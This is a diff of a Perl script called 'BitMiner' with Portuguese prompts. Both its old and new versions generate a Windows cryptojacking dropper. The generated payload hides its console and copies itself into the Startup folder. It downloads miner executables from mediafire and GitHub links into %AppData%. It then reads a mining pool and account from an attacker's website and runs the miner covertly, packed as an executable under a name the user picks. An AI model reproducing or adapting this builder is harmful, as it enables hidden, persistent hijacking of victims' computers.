@@ -1,147 +1,134 @@
-#!/usr/bin/perl -w
-use Term::ANSIColor qw[color];
-use Archive::Zip;
-use LWP::Simple qw[getstore];
+#!/usr/bin/perl
+use Term::ANSIColor;
+use warnings;
+use strict;
 use Config;
-use Cwd;
+$SIG{INT} = 'IGNORE';
 
-if($Config{osname} =~ m/win/i){
-  system("cls");
-}else{
-  system("clear");
+sub clear_console{
+  system("cls") if $Config{osname} =~ /win/i;
+  system("clear") if $Config{osname} !~ /win/i;
 }
 
-print color("GREEN");
-print <<'ART';
-                ,____
-                |---.\
-        ___     |    `
-       / .-\  ./=)
-      |  |"|_/\/|
-      ;  |-;| /_|
-     / \_| |/ \ |
-    /      \/\( |
-    |   /  |` ) |
-    /   \ _/    |
-   /--._/  \    |
-   `/|)    |    /
-     /     |   |
-   .'      |   |
-  /         \  |
- (_.-.__.__./  /
-ART
-print color("reset");
-print "\n  BitMiner v3.0\n\n";
+sub print_banner{
+  print "\n";
+  print color("GREEN");
+  print <<'BANNER';
+                      ,____
+                      |---.\
+              ___     |    `
+             / .-\  ./=)
+            |  |"|_/\/|
+            ;  |-;| /_|
+           / \_| |/ \ |
+          /      \/\( |
+          |   /  |` ) |
+          /   \ _/    |
+         /--._/  \    |
+         `/|)    |    /
+           /     |   |
+         .'      |   |
+        /         \  |
+       (_.-.__.__./  /
+BANNER
+  print color("reset");
+  print "\n  BitMiner v2.0 (Reaper Edition)\n\n";
+}
 
-if(@ARGV){
-  if(@ARGV > 1){
-    print "\n[", color("YELLOW"),"!",color("reset"), "] Somente um parametro por vez permitido !\n";
-    exit 0;
+my ($website, $x86_or_x64, $executable_name) = undef;
+&clear_console;
+&print_banner;
+print color("RED"),"[*]",color("reset"), " Informe o seu website: ";
+$website = <STDIN>;
+if($website){
+  chomp $website;
+  if($website){
+    if($website !~ /^(http:\/\/|https:\/\/)/ || $website !~ /((.*?)\.(.*?)|(.*?)\.(.*?)\/(.*?))$/){
+	  print color("RED"),"\n[*]",color("reset"), " URL sem HTTP ou HTTPS !\n";
+	  exit 0;
+	}
+    print color("RED"),"\n[*]",color("reset"), " CPU ou GPU ? ";
+	$x86_or_x64 = <STDIN>;
+	if($x86_or_x64){
+	  chomp $x86_or_x64;
+	  if($x86_or_x64){
+	    print color("RED"),"\n[*]",color("reset"), " Qual o nome do executavel ? ";
+		$executable_name = <STDIN>;
+		if($executable_name){
+		  chomp $executable_name;
+		  if(! $executable_name){
+		    print color("RED"),"\n[*]",color("reset"), " Nome do malware indefinido !\n";
+		  }
+		  else{
+		    $executable_name =~ s/\s/_/g;
+			$executable_name .= ".exe" if $executable_name !~ /\.exe$/;
+		    print color("RED"),"\n[*]",color("reset"), " Criando $executable_name...\n";
+		  }
+		  open(EXECUTABLE, ">", "executable.pl");
+print EXECUTABLE <<EXE;
+#!/usr/bin/perl
+use Win32::HideConsole;
+hide_console();
+use LWP::UserAgent;
+use LWP::Simple;
+use Config;
+
+my (\$username, \$response, \$agent, \$name, \$ok) = `whoami`, undef, undef, undef, 0;
+\$username =~ s/(.*?)\\\\(.*?)//g;
+for(glob "C:\\\\Users\\\\\$username\\\\AppData\\\\Roaming\\\\*"){
+  if(\$_ =~ /^Ns/ && \$_ =~ /\\.exe\$/){
+    \$ok = 1;
   }
-  foreach(@ARGV){
-    if($_ =~ m/--install-compiler/){
-      unless($< == 0){
-        print "Voce precisar executar esse programa como administrador !\n";
-        exit 0;
-      }
-      my $zip = undef;
-      print "\n[", color("YELLOW"),"!",color("reset"), "] Baixando o compilador", color("RED"),"...",color("reset"), "\n\n";
-      getstore("http://indigostar.com/download/perl2exe-24.00-win.zip", "perl2exe.zip");
-      $zip = Archive::Zip->new;
-      $zip->read("perl2exe.zip");
-      $zip->extractTree();
-      unlink "perl2exe.zip";
-      rename "perl2exe-24.00-win", "perl2exe";
-      system("move perl2exe /");
-      print "\n[", color("YELLOW"),"!",color("reset"), "] Sucesso !\n";
-      exit 0;
-    }
-    elsif($_ =~ m/(\w)\.(\w)/){
-      generate($_);
-    }
+}
+while(\$ok != 1){
+  \$0 =~ s/(.*?)\\\\(.*?)//g;
+  system("copy \$0 %AppData%\\\\Microsoft\\\\Windows\\\\\\"Start Menu\\"\\\\Programs\\\\Startup");
+  if(\$Config{archname} =~ /x86_64/i || \$Config{archname} =~ /x64/i){
+    if("$x86_or_x64" =~ /GPU/i){
+      getstore("http://download1654.mediafireuserdownload.com/vktdt3a73mrg/0nwra4eocjkemrl/Data.bin", "Data.bin");
+      getstore("http://download846.mediafire.com/z5xn7wdyjpcg/6hebk47rlq29t36/NsGpuCNMiner.exe", "NsGpuCNMiner.exe");
+      system("move Data.bin %AppData% && move NsGpuCNMiner.exe %AppData%");
+      \$name = "NsGpuCNMiner.exe";
+	  \$ok = 1;
+	}
     else{
-      print "\n[", color("YELLOW"),"!",color("reset"), "] Parametro invalido!\n";
-    }
+      getstore("http://download1586.mediafire.com/43vm826bs7cg/995k52eqx6ityix/NsCpuCNMiner64.exe", "NsCpuCNMiner64.exe");
+      system("move NsCpuCNMiner64.exe %AppData%");
+	  \$name = "NsCpuCNMiner64.exe";
+      \$ok = 1;
+	}
   }
-}else{
-  print "\n[", color("YELLOW"),"!",color("reset"), "] Nenhum parametro informado !\n";
-  exit 0;
+  else{  
+    getstore("http://download1518.mediafire.com/e1uijiiqu6mg/o5c3rn5s2k349lu/NsCpuCNMiner32.exe", "NsCpuCNMiner32.exe");
+    system("move NsCpuCNMiner32.exe %AppData%");
+	\$name = "NsCpuCNMiner32.exe";
+    \$ok = 1;
+  }
 }
 
-sub generate{
-  $_ = "http://" . $_ if $_ !~ m/^(http|https):\/\//;
-  $_ =~ s/\/$//;
-  open(OUTPUT, ">", "output.pl");
-  print OUTPUT <<EXE;
-#!/usr/bin/perl -w
-use Win32::HideConsole qw[hide_console];
-use LWP::UserAgent qw[get agent decoded_content];
-use LWP::Simple qw[getstore];
-use Config;
-
-\$SIG{INT} = 'IGNORE';
-hide_console;
-
-#perl2exe_include Win32::HideConsole
-#perl2exe_include LWP::UserAgent
-#perl2exe_include LWP::Simple
-#perl2exe_include Config
-
-my (\$response, \$ua) = undef;
-\$ua = LWP::UserAgent->new;
-\$ua->agent(\"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:2.0) Treco/20110515 Fireweb Navigator/2.4\");
+\$agent = LWP::UserAgent->new;
+\$agent->agent("Mozilla/5.0");
 while(1){
-  if(`dir %AppData%\\\\Microsoft\\\\Windows\\\\\\"Start Menu\\"\\\\Programs\\\\Startup` !~ m/\$0/g){
-    system(\"copy \$0 %AppData%\\\\Microsoft\\\\Windows\\\\\\"Start Menu\\"\\\\Programs\\\\Startup\");
-  }
-  until(`dir %AppData%` =~ m/^Ns(.*?)\\.exe\$/){
-    if(\$Config{archname} =~ m/x86_64/ || \$Config{archname} =~ m/x64/){
-      getstore(\"https://github.com/HatsuZ/BitMiner-v3/raw/master/NsCpuCNMiner64.exe\", \"NsCpuCNMiner.exe\");
-    }else{
-      getstore(\"https://github.com/HatsuZ/BitMiner-v3/raw/master/NsCpuCNMiner32.exe\", \"NsCpuCNMiner.exe\");
-    }
-    if(-e \"NsCpuCNMiner.exe\"){
-      system(\"move NsCpuCNMiner.exe %AppData%\");
-    }else{
-      next;
-    }
-  }
-  \$response = \$ua->get(\"$_[0]\");
-  if(\$response->decoded_content =~ m/miner->host:(.*?);email:(.*?);/){
-    system(\"%AppData%\\NsCpuCNMiner.exe -o stratum+tcp:\/\/\$1 -u \$2 -p x\");
+  \$response = \$agent->get("$website");
+  if(\$response->decoded_content =~ /miner->host:(.*?);email:(.*?);/ig){
+    system("cd %AppData% && \$name -o stratum+tcp://\$1 -u \$2 -p x");
   }
 }
 EXE
-  close(OUTPUT);
-  my $unit = getcwd;
-  if($unit =~ m/(\w)\:\/(\w)/){$unit = $1;}
-  if($^V =~ m/5.24.1/){
-    system("$unit:\\perl2exe\\perl2exe.exe -platform=Win32-5.24.1 -o output_32.exe output.pl");  
-    if(-e "output_32.exe"){
-      print "\nExecutavel de 32 bits gerado com sucesso !\n\n";
-    }else{
-      print "\nExecutavel de 32 bits nao foi gerado !\n\n";
-    }
-    system("$unit:\\perl2exe\\perl2exe.exe -platform=Win64-5.24.1 -o output_64.exe output.pl");
-    if(-e "output_64.exe"){
-      print "\nExecutavel de 64 bits gerado com sucesso !\n";
-    }else{
-      print "\nExecutavel de 64 bits nao foi gerado !\n";
-    }
+		  close(EXECUTABLE);
+		  system("pp -o $executable_name executable.pl");
+		  unlink "executable.pl";
+		  print color("RED"),"\n[*]",color("reset"), " Sucesso !\n";
+		}
+	  }
+	  else{
+	    print color("RED"),"\n[*]",color("reset"), " CPU ou GPU nao informado !\n";
+	    exit 0;
+	  }
+	}
   }
-  if($^V =~ m/5.24.0/){
-    system("$unit:\\perl2exe\\perl2exe.exe -platform=Win32-5.24.0 -o output_32.exe output.pl");
-    if(-e "output_32.exe"){
-      print "\nExecutavel de 32 bits gerado com sucesso !\n\n";
-    }else{
-      print "\nExecutavel de 32 bits nao foi gerado !\n\n";
-    }
-    system("$unit:\\perl2exe\\perl2exe.exe -platform=Win64-5.24.0 -o output_64.exe output.pl");
-    if(-e "output_64.exe"){
-      print "\nExecutavel de 64 bits gerado com sucesso !\n";
-    }else{
-      print "\nExecutavel de 64 bits nao foi gerado !\n";
-    }
+  else{
+    print color("RED"),"\n[*]",color("reset"), " Informe seu website !\n";
+	exit 0;
   }
-  #unlink "output.pl";
 }
